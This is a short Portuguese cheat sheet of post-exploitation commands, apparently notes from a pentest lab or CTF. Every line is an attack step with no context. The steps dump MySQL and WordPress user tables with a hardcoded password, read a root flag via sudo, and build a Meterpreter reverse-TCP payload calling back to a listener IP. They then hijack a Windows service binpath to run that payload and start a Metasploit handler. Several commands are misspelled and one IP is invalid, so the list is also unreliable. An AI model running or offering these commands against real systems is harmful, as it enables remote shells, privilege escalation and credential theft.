# posexploracao
Lista de comandos relacionados a pentest

sqlite3
.tables
select * from Users


rbscheat -i 172.16.1000.11:2223 -l bash

echo "select * from mysql.user;" | mysql -h 127.0.0.1 -uwordpress -pskade 

echo "select * from wordpress.wp_users;" | mysql -h 127.0.0.1 -uwordpress -pskade 

export TERM=xterm

sudo base64 /root/flag.txt | base64 -d

acesschk.exe -uqmv .\tyranus-op 

sc config raxus-service obj=".\LocalSystem"

msvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.100.210 lport=443 -f exe -o invasao.exe
sc config raxus-service binpath="C:\users\tyranus-op\invasao.exe"

service postgresql start

use multi/handler

set AutorunScript post/windows/manager/migrate/




